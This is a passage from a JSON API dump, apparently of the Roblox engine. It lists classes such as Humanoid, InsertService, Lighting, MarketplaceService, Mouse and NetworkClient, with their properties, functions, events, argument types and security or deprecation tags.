":"active","Type":"bool"}],"Name":"Ragdoll","tags":[],"Class":"Humanoid","type":"Event"},{"Arguments":[{"Name":"speed","Type":"float"}],"Name":"Running","tags":[],"Class":"Humanoid","type":"Event"},{"Arguments":[{"Name":"active","Type":"bool"},{"Name":"currentSeatPart","Type":"Instance"}],"Name":"Seated","tags":[],"Class":"Humanoid","type":"Event"},{"Arguments":[{"Name":"old","Type":"HumanoidStateType"},{"Name":"new","Type":"HumanoidStateType"}],"Name":"StateChanged","tags":[],"Class":"Humanoid","type":"Event"},{"Arguments":[{"Name":"state","Type":"HumanoidStateType"},{"Name":"isEnabled","Type":"bool"}],"Name":"StateEnabledChanged","tags":[],"Class":"Humanoid","type":"Event"},{"Arguments":[{"Name":"status","Type":"Status"}],"Name":"StatusAdded","tags":["deprecated"],"Class":"Humanoid","type":"Event"},{"Arguments":[{"Name":"status","Type":"Status"}],"Name":"StatusRemoved","tags":["deprecated"],"Class":"Humanoid","type":"Event"},{"Arguments":[{"Name":"active","Type":"bool"}],"Name":"Strafing","tags":[],"Class":"Humanoid","type":"Event"},{"Arguments":[{"Name":"speed","Type":"float"}],"Name":"Swimming","tags":[],"Class":"Humanoid","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"InputObject","tags":["notCreatable"]},{"ValueType":"Vector3","type":"Property","Name":"Delta","tags":[],"Class":"InputObject"},{"ValueType":"KeyCode","type":"Property","Name":"KeyCode","tags":[],"Class":"InputObject"},{"ValueType":"Vector3","type":"Property","Name":"Position","tags":[],"Class":"InputObject"},{"ValueType":"UserInputState","type":"Property","Name":"UserInputState","tags":[],"Class":"InputObject"},{"ValueType":"UserInputType","type":"Property","Name":"UserInputType","tags":[],"Class":"InputObject"},{"Superclass":"Instance","type":"Class","Name":"InsertService","tags":["notCreatable"]},{"ValueType":"bool","type":"Property","Name":"AllowInsertFreeModels","tags":[],"Class":"InsertService"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"assetId","Default":null}],"Name":"ApproveAssetId","tags":["deprecated"],"Class":"InsertService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"assetVersionId","Default":null}],"Name":"ApproveAssetVersionId","tags":["deprecated"],"Class":"InsertService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"instance","Default":null}],"Name":"Insert","tags":["deprecated"],"Class":"InsertService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"enable","Default":null},{"Type":"bool","Name":"user","Default":"false"}],"Name":"SetAdvancedResults","tags":["LocalUserSecurity"],"Class":"InsertService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"assetUrl","Default":null}],"Name":"SetAssetUrl","tags":["LocalUserSecurity"],"Class":"InsertService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"assetVersionUrl","Default":null}],"Name":"SetAssetVersionUrl","tags":["LocalUserSecurity"],"Class":"InsertService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"baseSetsUrl","Default":null}],"Name":"SetBaseCategoryUrl","tags":["LocalUserSecurity"],"Class":"InsertService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"baseSetsUrl","Default":null}],"Name":"SetBaseSetsUrl","tags":["LocalUserSecurity"],"Class":"InsertService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"collectionUrl","Default":null}],"Name":"SetCollectionUrl","tags":["LocalUserSecurity"],"Class":"InsertService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"freeDecalUrl","Default":null}],"Name":"SetFreeDecalUrl","tags":["LocalUserSecurity"],"Class":"InsertService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"freeModelUrl","Default":null}],"Name":"SetFreeModelUrl","tags":["LocalUserSecurity"],"Class":"InsertService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"float","Name":"trustLevel","Default":null}],"Name":"SetTrustLevel","tags":["LocalUserSecurity"],"Class":"InsertService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"userSetsUrl","Default":null}],"Name":"SetUserCategoryUrl","tags":["LocalUserSecurity"],"Class":"InsertService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"userSetsUrl","Default":null}],"Name":"SetUserSetsUrl","tags":["LocalUserSecurity"],"Class":"InsertService","type":"Function"},{"ReturnType":"Array","Arguments":[],"Name":"GetBaseCategories","tags":["deprecated"],"Class":"InsertService","type":"YieldFunction"},{"ReturnType":"Array","Arguments":[],"Name":"GetBaseSets","tags":[],"Class":"InsertService","type":"YieldFunction"},{"ReturnType":"Array","Arguments":[{"Type":"int","Name":"categoryId","Default":null}],"Name":"GetCollection","tags":[],"Class":"InsertService","type":"YieldFunction"},{"ReturnType":"Array","Arguments":[{"Type":"string","Name":"searchText","Default":null},{"Type":"int","Name":"pageNum","Default":null}],"Name":"GetFreeDecals","tags":[],"Class":"InsertService","type":"YieldFunction"},{"ReturnType":"Array","Arguments":[{"Type":"string","Name":"searchText","Default":null},{"Type":"int","Name":"pageNum","Default":null}],"Name":"GetFreeModels","tags":[],"Class":"InsertService","type":"YieldFunction"},{"ReturnType":"int","Arguments":[{"Type":"int","Name":"assetId","Default":null}],"Name":"GetLatestAssetVersionAsync","tags":[],"Class":"InsertService","type":"YieldFunction"},{"ReturnType":"Array","Arguments":[{"Type":"int","Name":"userId","Default":null}],"Name":"GetUserCategories","tags":["deprecated"],"Class":"InsertService","type":"YieldFunction"},{"ReturnType":"Array","Arguments":[{"Type":"int","Name":"userId","Default":null}],"Name":"GetUserSets","tags":[],"Class":"InsertService","type":"YieldFunction"},{"ReturnType":"Instance","Arguments":[{"Type":"int","Name":"assetId","Default":null}],"Name":"LoadAsset","tags":[],"Class":"InsertService","type":"YieldFunction"},{"ReturnType":"Instance","Arguments":[{"Type":"int","Name":"assetVersionId","Default":null}],"Name":"LoadAssetVersion","tags":[],"Class":"InsertService","type":"YieldFunction"},{"ReturnType":"Instance","Arguments":[{"Type":"int","Name":"assetId","Default":null}],"Name":"loadAsset","tags":["deprecated"],"Class":"InsertService","type":"YieldFunction"},{"Superclass":"Instance","type":"Class","Name":"InstancePacketCache","tags":[]},{"Superclass":"Instance","type":"Class","Name":"IntConstrainedValue","tags":[]},{"ValueType":"int","type":"Property","Name":"ConstrainedValue","tags":["hidden"],"Class":"IntConstrainedValue"},{"ValueType":"int","type":"Property","Name":"MaxValue","tags":[],"Class":"IntConstrainedValue"},{"ValueType":"int","type":"Property","Name":"MinValue","tags":[],"Class":"IntConstrainedValue"},{"ValueType":"int","type":"Property","Name":"Value","tags":[],"Class":"IntConstrainedValue"},{"Arguments":[{"Name":"value","Type":"int"}],"Name":"Changed","tags":[],"Class":"IntConstrainedValue","type":"Event"},{"Arguments":[{"Name":"value","Type":"int"}],"Name":"changed","tags":["deprecated"],"Class":"IntConstrainedValue","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"IntValue","tags":[]},{"ValueType":"int","type":"Property","Name":"Value","tags":[],"Class":"IntValue"},{"Arguments":[{"Name":"value","Type":"int"}],"Name":"Changed","tags":[],"Class":"IntValue","type":"Event"},{"Arguments":[{"Name":"value","Type":"int"}],"Name":"changed","tags":["deprecated"],"Class":"IntValue","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"JointInstance","tags":[]},{"ValueType":"CoordinateFrame","type":"Property","Name":"C0","tags":[],"Class":"JointInstance"},{"ValueType":"CoordinateFrame","type":"Property","Name":"C1","tags":[],"Class":"JointInstance"},{"ValueType":"Object","type":"Property","Name":"Part0","tags":[],"Class":"JointInstance"},{"ValueType":"Object","type":"Property","Name":"Part1","tags":[],"Class":"JointInstance"},{"ValueType":"Object","type":"Property","Name":"part1","tags":["deprecated","hidden"],"Class":"JointInstance"},{"Superclass":"JointInstance","type":"Class","Name":"DynamicRotate","tags":[]},{"ValueType":"float","type":"Property","Name":"BaseAngle","tags":[],"Class":"DynamicRotate"},{"Superclass":"DynamicRotate","type":"Class","Name":"RotateP","tags":[]},{"Superclass":"DynamicRotate","type":"Class","Name":"RotateV","tags":[]},{"Superclass":"JointInstance","type":"Class","Name":"Glue","tags":[]},{"ValueType":"Vector3","type":"Property","Name":"F0","tags":[],"Class":"Glue"},{"ValueType":"Vector3","type":"Property","Name":"F1","tags":[],"Class":"Glue"},{"ValueType":"Vector3","type":"Property","Name":"F2","tags":[],"Class":"Glue"},{"ValueType":"Vector3","type":"Property","Name":"F3","tags":[],"Class":"Glue"},{"Superclass":"JointInstance","type":"Class","Name":"ManualSurfaceJointInstance","tags":[]},{"Superclass":"ManualSurfaceJointInstance","type":"Class","Name":"ManualGlue","tags":[]},{"Superclass":"ManualSurfaceJointInstance","type":"Class","Name":"ManualWeld","tags":[]},{"Superclass":"JointInstance","type":"Class","Name":"Motor","tags":[]},{"ValueType":"float","type":"Property","Name":"CurrentAngle","tags":[],"Class":"Motor"},{"ValueType":"float","type":"Property","Name":"DesiredAngle","tags":[],"Class":"Motor"},{"ValueType":"float","type":"Property","Name":"MaxVelocity","tags":[],"Class":"Motor"},{"ReturnType":"void","Arguments":[{"Type":"float","Name":"value","Default":null}],"Name":"SetDesiredAngle","tags":[],"Class":"Motor","type":"Function"},{"Superclass":"Motor","type":"Class","Name":"Motor6D","tags":[]},{"Superclass":"JointInstance","type":"Class","Name":"Rotate","tags":[]},{"Superclass":"JointInstance","type":"Class","Name":"Snap","tags":[]},{"Superclass":"JointInstance","type":"Class","Name":"VelocityMotor","tags":[]},{"ValueType":"float","type":"Property","Name":"CurrentAngle","tags":[],"Class":"VelocityMotor"},{"ValueType":"float","type":"Property","Name":"DesiredAngle","tags":[],"Class":"VelocityMotor"},{"ValueType":"Object","type":"Property","Name":"Hole","tags":[],"Class":"VelocityMotor"},{"ValueType":"float","type":"Property","Name":"MaxVelocity","tags":[],"Class":"VelocityMotor"},{"Superclass":"JointInstance","type":"Class","Name":"Weld","tags":[]},{"Superclass":"Instance","type":"Class","Name":"JointsService","tags":["notCreatable"]},{"ReturnType":"void","Arguments":[],"Name":"ClearJoinAfterMoveJoints","tags":[],"Class":"JointsService","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"CreateJoinAfterMoveJoints","tags":[],"Class":"JointsService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"joinInstance","Default":null}],"Name":"SetJoinAfterMoveInstance","tags":[],"Class":"JointsService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"joinTarget","Default":null}],"Name":"SetJoinAfterMoveTarget","tags":[],"Class":"JointsService","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"ShowPermissibleJoints","tags":[],"Class":"JointsService","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"Keyframe","tags":[]},{"ValueType":"float","type":"Property","Name":"Time","tags":[],"Class":"Keyframe"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"pose","Default":null}],"Name":"AddPose","tags":[],"Class":"Keyframe","type":"Function"},{"ReturnType":"Objects","Arguments":[],"Name":"GetPoses","tags":[],"Class":"Keyframe","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"pose","Default":null}],"Name":"RemovePose","tags":[],"Class":"Keyframe","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"KeyframeSequence","tags":[]},{"ValueType":"bool","type":"Property","Name":"Loop","tags":[],"Class":"KeyframeSequence"},{"ValueType":"AnimationPriority","type":"Property","Name":"Priority","tags":[],"Class":"KeyframeSequence"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"keyframe","Default":null}],"Name":"AddKeyframe","tags":[],"Class":"KeyframeSequence","type":"Function"},{"ReturnType":"Objects","Arguments":[],"Name":"GetKeyframes","tags":[],"Class":"KeyframeSequence","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"keyframe","Default":null}],"Name":"RemoveKeyframe","tags":[],"Class":"KeyframeSequence","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"KeyframeSequenceProvider","tags":[]},{"ReturnType":"Instance","Arguments":[{"Type":"Content","Name":"assetId","Default":null}],"Name":"GetKeyframeSequence","tags":[],"Class":"KeyframeSequenceProvider","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"int","Name":"assetId","Default":null},{"Type":"bool","Name":"useCache","Default":null}],"Name":"GetKeyframeSequenceById","tags":[],"Class":"KeyframeSequenceProvider","type":"Function"},{"ReturnType":"Content","Arguments":[{"Type":"Instance","Name":"keyframeSequence","Default":null}],"Name":"RegisterActiveKeyframeSequence","tags":[],"Class":"KeyframeSequenceProvider","type":"Function"},{"ReturnType":"Content","Arguments":[{"Type":"Instance","Name":"keyframeSequence","Default":null}],"Name":"RegisterKeyframeSequence","tags":[],"Class":"KeyframeSequenceProvider","type":"Function"},{"ReturnType":"Dictionary","Arguments":[{"Type":"int","Name":"userId","Default":null},{"Type":"int","Name":"page","Default":"1"}],"Name":"GetAnimations","tags":[],"Class":"KeyframeSequenceProvider","type":"YieldFunction"},{"Superclass":"Instance","type":"Class","Name":"Light","tags":[]},{"ValueType":"float","type":"Property","Name":"Brightness","tags":[],"Class":"Light"},{"ValueType":"Color3","type":"Property","Name":"Color","tags":[],"Class":"Light"},{"ValueType":"bool","type":"Property","Name":"Enabled","tags":[],"Class":"Light"},{"ValueType":"bool","type":"Property","Name":"Shadows","tags":[],"Class":"Light"},{"Superclass":"Light","type":"Class","Name":"PointLight","tags":[]},{"ValueType":"float","type":"Property","Name":"Range","tags":[],"Class":"PointLight"},{"Superclass":"Light","type":"Class","Name":"SpotLight","tags":[]},{"ValueType":"float","type":"Property","Name":"Angle","tags":[],"Class":"SpotLight"},{"ValueType":"NormalId","type":"Property","Name":"Face","tags":[],"Class":"SpotLight"},{"ValueType":"float","type":"Property","Name":"Range","tags":[],"Class":"SpotLight"},{"Superclass":"Light","type":"Class","Name":"SurfaceLight","tags":[]},{"ValueType":"float","type":"Property","Name":"Angle","tags":[],"Class":"SurfaceLight"},{"ValueType":"NormalId","type":"Property","Name":"Face","tags":[],"Class":"SurfaceLight"},{"ValueType":"float","type":"Property","Name":"Range","tags":[],"Class":"SurfaceLight"},{"Superclass":"Instance","type":"Class","Name":"Lighting","tags":["notCreatable"]},{"ValueType":"Color3","type":"Property","Name":"Ambient","tags":[],"Class":"Lighting"},{"ValueType":"float","type":"Property","Name":"Brightness","tags":[],"Class":"Lighting"},{"ValueType":"Color3","type":"Property","Name":"ColorShift_Bottom","tags":[],"Class":"Lighting"},{"ValueType":"Color3","type":"Property","Name":"ColorShift_Top","tags":[],"Class":"Lighting"},{"ValueType":"Color3","type":"Property","Name":"FogColor","tags":[],"Class":"Lighting"},{"ValueType":"float","type":"Property","Name":"FogEnd","tags":[],"Class":"Lighting"},{"ValueType":"float","type":"Property","Name":"FogStart","tags":[],"Class":"Lighting"},{"ValueType":"float","type":"Property","Name":"GeographicLatitude","tags":[],"Class":"Lighting"},{"ValueType":"bool","type":"Property","Name":"GlobalShadows","tags":[],"Class":"Lighting"},{"ValueType":"Color3","type":"Property","Name":"OutdoorAmbient","tags":[],"Class":"Lighting"},{"ValueType":"bool","type":"Property","Name":"Outlines","tags":[],"Class":"Lighting"},{"ValueType":"Color3","type":"Property","Name":"ShadowColor","tags":[],"Class":"Lighting"},{"ValueType":"string","type":"Property","Name":"TimeOfDay","tags":[],"Class":"Lighting"},{"ReturnType":"double","Arguments":[],"Name":"GetMinutesAfterMidnight","tags":[],"Class":"Lighting","type":"Function"},{"ReturnType":"Vector3","Arguments":[],"Name":"GetMoonDirection","tags":[],"Class":"Lighting","type":"Function"},{"ReturnType":"float","Arguments":[],"Name":"GetMoonPhase","tags":[],"Class":"Lighting","type":"Function"},{"ReturnType":"Vector3","Arguments":[],"Name":"GetSunDirection","tags":[],"Class":"Lighting","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"double","Name":"minutes","Default":null}],"Name":"SetMinutesAfterMidnight","tags":[],"Class":"Lighting","type":"Function"},{"ReturnType":"double","Arguments":[],"Name":"getMinutesAfterMidnight","tags":["deprecated"],"Class":"Lighting","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"double","Name":"minutes","Default":null}],"Name":"setMinutesAfterMidnight","tags":["deprecated"],"Class":"Lighting","type":"Function"},{"Arguments":[{"Name":"skyboxChanged","Type":"bool"}],"Name":"LightingChanged","tags":[],"Class":"Lighting","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"LocalWorkspace","tags":["notCreatable"]},{"Superclass":"Instance","type":"Class","Name":"LogService","tags":["notCreatable"]},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"source","Default":null}],"Name":"ExecuteScript","tags":["RobloxScriptSecurity"],"Class":"LogService","type":"Function"},{"ReturnType":"Array","Arguments":[],"Name":"GetLogHistory","tags":[],"Class":"LogService","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"RequestServerOutput","tags":["RobloxScriptSecurity"],"Class":"LogService","type":"Function"},{"Arguments":[{"Name":"message","Type":"string"},{"Name":"messageType","Type":"MessageType"}],"Name":"MessageOut","tags":[],"Class":"LogService","type":"Event"},{"Arguments":[{"Name":"message","Type":"string"},{"Name":"messageType","Type":"MessageType"},{"Name":"timestamp","Type":"int"}],"Name":"ServerMessageOut","tags":["RobloxScriptSecurity"],"Class":"LogService","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"LoginService","tags":[]},{"ReturnType":"void","Arguments":[],"Name":"Logout","tags":["RobloxSecurity"],"Class":"LoginService","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"PromptLogin","tags":["RobloxSecurity"],"Class":"LoginService","type":"Function"},{"Arguments":[{"Name":"loginError","Type":"string"}],"Name":"LoginFailed","tags":["RobloxSecurity"],"Class":"LoginService","type":"Event"},{"Arguments":[{"Name":"username","Type":"string"}],"Name":"LoginSucceeded","tags":["RobloxSecurity"],"Class":"LoginService","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"LuaSettings","tags":[]},{"ValueType":"bool","type":"Property","Name":"AreScriptStartsReported","tags":[],"Class":"LuaSettings"},{"ValueType":"double","type":"Property","Name":"DefaultWaitTime","tags":[],"Class":"LuaSettings"},{"ValueType":"int","type":"Property","Name":"GcFrequency","tags":[],"Class":"LuaSettings"},{"ValueType":"int","type":"Property","Name":"GcLimit","tags":[],"Class":"LuaSettings"},{"ValueType":"int","type":"Property","Name":"GcPause","tags":[],"Class":"LuaSettings"},{"ValueType":"int","type":"Property","Name":"GcStepMul","tags":[],"Class":"LuaSettings"},{"ValueType":"float","type":"Property","Name":"WaitingThreadsBudget","tags":[],"Class":"LuaSettings"},{"Superclass":"Instance","type":"Class","Name":"LuaSourceContainer","tags":[]},{"Superclass":"LuaSourceContainer","type":"Class","Name":"BaseScript","tags":[]},{"ValueType":"bool","type":"Property","Name":"Disabled","tags":[],"Class":"BaseScript"},{"ValueType":"Content","type":"Property","Name":"LinkedSource","tags":[],"Class":"BaseScript"},{"Superclass":"BaseScript","type":"Class","Name":"CoreScript","tags":["notCreatable"]},{"Superclass":"BaseScript","type":"Class","Name":"Script","tags":[]},{"ValueType":"ProtectedString","type":"Property","Name":"Source","tags":["PluginSecurity"],"Class":"Script"},{"ReturnType":"string","Arguments":[],"Name":"GetHash","tags":["RobloxPlaceSecurity"],"Class":"Script","type":"Function"},{"Superclass":"Script","type":"Class","Name":"LocalScript","tags":[]},{"Superclass":"LuaSourceContainer","type":"Class","Name":"ModuleScript","tags":[]},{"ValueType":"Content","type":"Property","Name":"LinkedSource","tags":[],"Class":"ModuleScript"},{"ValueType":"ProtectedString","type":"Property","Name":"Source","tags":["PluginSecurity"],"Class":"ModuleScript"},{"Superclass":"Instance","type":"Class","Name":"LuaWebService","tags":[]},{"Superclass":"Instance","type":"Class","Name":"MarketplaceService","tags":["notCreatable"]},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"player","Default":null},{"Type":"string","Name":"productId","Default":null}],"Name":"PromptNativePurchase","tags":["RobloxScriptSecurity"],"Class":"MarketplaceService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"player","Default":null},{"Type":"int","Name":"productId","Default":null},{"Type":"bool","Name":"equipIfPurchased","Default":"true"},{"Type":"CurrencyType","Name":"currencyType","Default":"Default"}],"Name":"PromptProductPurchase","tags":[],"Class":"MarketplaceService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"player","Default":null},{"Type":"int","Name":"assetId","Default":null},{"Type":"bool","Name":"equipIfPurchased","Default":"true"},{"Type":"CurrencyType","Name":"currencyType","Default":"Default"}],"Name":"PromptPurchase","tags":[],"Class":"MarketplaceService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"player","Default":null},{"Type":"string","Name":"productId","Default":null}],"Name":"PromptThirdPartyPurchase","tags":["RobloxPlaceSecurity"],"Class":"MarketplaceService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"assetId","Default":null},{"Type":"int","Name":"robuxAmount","Default":null}],"Name":"ReportAssetSale","tags":["RobloxScriptSecurity"],"Class":"MarketplaceService","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"ReportRobuxUpsellStarted","tags":["RobloxScriptSecurity"],"Class":"MarketplaceService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"ticket","Default":null},{"Type":"int","Name":"playerId","Default":null},{"Type":"int","Name":"productId","Default":null}],"Name":"SignalClientPurchaseSuccess","tags":["RobloxScriptSecurity"],"Class":"MarketplaceService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"userId","Default":null},{"Type":"int","Name":"productId","Default":null},{"Type":"bool","Name":"success","Default":null}],"Name":"SignalPromptProductPurchaseFinished","tags":["RobloxScriptSecurity"],"Class":"MarketplaceService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"player","Default":null},{"Type":"int","Name":"assetId","Default":null},{"Type":"bool","Name":"success","Default":null}],"Name":"SignalPromptPurchaseFinished","tags":["RobloxScriptSecurity"],"Class":"MarketplaceService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"value","Default":null}],"Name":"SignalServerLuaDialogClosed","tags":["RobloxScriptSecurity"],"Class":"MarketplaceService","type":"Function"},{"ReturnType":"Instance","Arguments":[],"Name":"GetDeveloperProductsAsync","tags":[],"Class":"MarketplaceService","type":"YieldFunction"},{"ReturnType":"Dictionary","Arguments":[{"Type":"int","Name":"assetId","Default":null},{"Type":"InfoType","Name":"infoType","Default":"Asset"}],"Name":"GetProductInfo","tags":[],"Class":"MarketplaceService","type":"YieldFunction"},{"ReturnType":"bool","Arguments":[{"Type":"Instance","Name":"player","Default":null},{"Type":"int","Name":"assetId","Default":null}],"Name":"PlayerOwnsAsset","tags":[],"Class":"MarketplaceService","type":"YieldFunction"},{"Arguments":[{"Name":"arguments","Type":"Tuple"}],"Name":"ClientLuaDialogRequested","tags":["RobloxScriptSecurity"],"Class":"MarketplaceService","type":"Event"},{"Arguments":[{"Name":"ticket","Type":"string"},{"Name":"playerId","Type":"int"},{"Name":"productId","Type":"int"}],"Name":"ClientPurchaseSuccess","tags":["RobloxScriptSecurity"],"Class":"MarketplaceService","type":"Event"},{"Arguments":[{"Name":"player","Type":"Instance"},{"Name":"productId","Type":"string"},{"Name":"wasPurchased","Type":"bool"}],"Name":"NativePurchaseFinished","tags":["RobloxScriptSecurity"],"Class":"MarketplaceService","type":"Event"},{"Arguments":[{"Name":"userId","Type":"int"},{"Name":"productId","Type":"int"},{"Name":"isPurchased","Type":"bool"}],"Name":"PromptProductPurchaseFinished","tags":["deprecated"],"Class":"MarketplaceService","type":"Event"},{"Arguments":[{"Name":"player","Type":"Instance"},{"Name":"productId","Type":"int"},{"Name":"equipIfPurchased","Type":"bool"},{"Name":"currencyType","Type":"CurrencyType"}],"Name":"PromptProductPurchaseRequested","tags":["RobloxScriptSecurity"],"Class":"MarketplaceService","type":"Event"},{"Arguments":[{"Name":"player","Type":"Instance"},{"Name":"assetId","Type":"int"},{"Name":"isPurchased","Type":"bool"}],"Name":"PromptPurchaseFinished","tags":[],"Class":"MarketplaceService","type":"Event"},{"Arguments":[{"Name":"player","Type":"Instance"},{"Name":"assetId","Type":"int"},{"Name":"equipIfPurchased","Type":"bool"},{"Name":"currencyType","Type":"CurrencyType"}],"Name":"PromptPurchaseRequested","tags":["RobloxScriptSecurity"],"Class":"MarketplaceService","type":"Event"},{"Arguments":[{"Name":"serverResponseTable","Type":"Dictionary"}],"Name":"ServerPurchaseVerification","tags":["RobloxScriptSecurity"],"Class":"MarketplaceService","type":"Event"},{"Arguments":[{"Name":"player","Type":"Instance"},{"Name":"productId","Type":"string"},{"Name":"receipt","Type":"string"},{"Name":"wasPurchased","Type":"bool"}],"Name":"ThirdPartyPurchaseFinished","tags":["RobloxPlaceSecurity"],"Class":"MarketplaceService","type":"Event"},{"ReturnType":"ProductPurchaseDecision","Arguments":[{"Name":"receiptInfo","Type":"Dictionary"}],"Name":"ProcessReceipt","tags":[],"Class":"MarketplaceService","type":"Callback"},{"Superclass":"Instance","type":"Class","Name":"Message","tags":["deprecated"]},{"ValueType":"string","type":"Property","Name":"Text","tags":[],"Class":"Message"},{"Superclass":"Message","type":"Class","Name":"Hint","tags":["deprecated"]},{"Superclass":"Instance","type":"Class","Name":"Mouse","tags":[]},{"ValueType":"CoordinateFrame","type":"Property","Name":"Hit","tags":["readonly"],"Class":"Mouse"},{"ValueType":"Content","type":"Property","Name":"Icon","tags":[],"Class":"Mouse"},{"ValueType":"CoordinateFrame","type":"Property","Name":"Origin","tags":["readonly"],"Class":"Mouse"},{"ValueType":"Object","type":"Property","Name":"Target","tags":["readonly"],"Class":"Mouse"},{"ValueType":"Object","type":"Property","Name":"TargetFilter","tags":[],"Class":"Mouse"},{"ValueType":"NormalId","type":"Property","Name":"TargetSurface","tags":["readonly"],"Class":"Mouse"},{"ValueType":"Ray","type":"Property","Name":"UnitRay","tags":["readonly"],"Class":"Mouse"},{"ValueType":"int","type":"Property","Name":"ViewSizeX","tags":["readonly"],"Class":"Mouse"},{"ValueType":"int","type":"Property","Name":"ViewSizeY","tags":["readonly"],"Class":"Mouse"},{"ValueType":"int","type":"Property","Name":"X","tags":["readonly"],"Class":"Mouse"},{"ValueType":"int","type":"Property","Name":"Y","tags":["readonly"],"Class":"Mouse"},{"ValueType":"CoordinateFrame","type":"Property","Name":"hit","tags":["deprecated","hidden","readonly"],"Class":"Mouse"},{"ValueType":"Object","type":"Property","Name":"target","tags":["deprecated","readonly"],"Class":"Mouse"},{"Arguments":[],"Name":"Button1Down","tags":[],"Class":"Mouse","type":"Event"},{"Arguments":[],"Name":"Button1Up","tags":[],"Class":"Mouse","type":"Event"},{"Arguments":[],"Name":"Button2Down","tags":[],"Class":"Mouse","type":"Event"},{"Arguments":[],"Name":"Button2Up","tags":[],"Class":"Mouse","type":"Event"},{"Arguments":[],"Name":"Idle","tags":[],"Class":"Mouse","type":"Event"},{"Arguments":[{"Name":"key","Type":"string"}],"Name":"KeyDown","tags":["deprecated"],"Class":"Mouse","type":"Event"},{"Arguments":[{"Name":"key","Type":"string"}],"Name":"KeyUp","tags":["deprecated"],"Class":"Mouse","type":"Event"},{"Arguments":[],"Name":"Move","tags":[],"Class":"Mouse","type":"Event"},{"Arguments":[],"Name":"WheelBackward","tags":[],"Class":"Mouse","type":"Event"},{"Arguments":[],"Name":"WheelForward","tags":[],"Class":"Mouse","type":"Event"},{"Arguments":[{"Name":"key","Type":"string"}],"Name":"keyDown","tags":["deprecated"],"Class":"Mouse","type":"Event"},{"Superclass":"Mouse","type":"Class","Name":"PlayerMouse","tags":[]},{"Superclass":"Mouse","type":"Class","Name":"PluginMouse","tags":[]},{"Arguments":[{"Name":"instances","Type":"Objects"}],"Name":"DragEnter","tags":["PluginSecurity"],"Class":"PluginMouse","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"NetworkMarker","tags":["notbrowsable"]},{"Arguments":[],"Name":"Received","tags":[],"Class":"NetworkMarker","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"NetworkPeer","tags":["notbrowsable"]},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"limit","Default":null}],"Name":"SetOutgoingKBPSLimit","tags":["PluginSecurity"],"Class":"NetworkPeer","type":"Function"},{"Superclass":"NetworkPeer","type":"Class","Name":"NetworkClient","tags":["notCreatable"]},{"ValueType":"string","type":"Property","Name":"Ticket","tags":[],"Class":"NetworkClient"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"blockDuration","Default":"3000"}],"Name":"Disconnect","tags":["LocalUserSecurity"],"Class":"NetworkClient","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"int","Name":"userId","Default":null},{"Type":"string","Name":"server","Default":null},{"Type":"int","Name":"serverPort","Default":null},{"Type":"int","Name":"clientPort","Default":"0"},{"Type":"int","Name":"threadSleepTime","Default":"30"}],"Name":"PlayerConnect","tags":["PluginSecurity"],"Class":"NetworkClient","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"gameSessionID","Default":null}],"Name":"SetGameSessionID","tags":["RobloxSecurity"],"Class":"NetworkClient","type":"Function"},{"Arguments":[{"Name":"peer","Type":"string"},{"Name":"replicator","Type":"Instance"}],"Name":"ConnectionAccepted","tags":[],"Class":"NetworkClient","type":"Event"},{"Arguments":[{"Name":"peer","Type":"string"},{"Name":"code","Type":"int"},{"Name":"reason","Type":"string"}],"Name":"ConnectionFailed","tags":[],"Class":"NetworkClient","type":"Event"},{"Arguments":[{"Name":"peer","Type":"string"}],"Name":"ConnectionRejected","tags":[],"Class":"NetworkC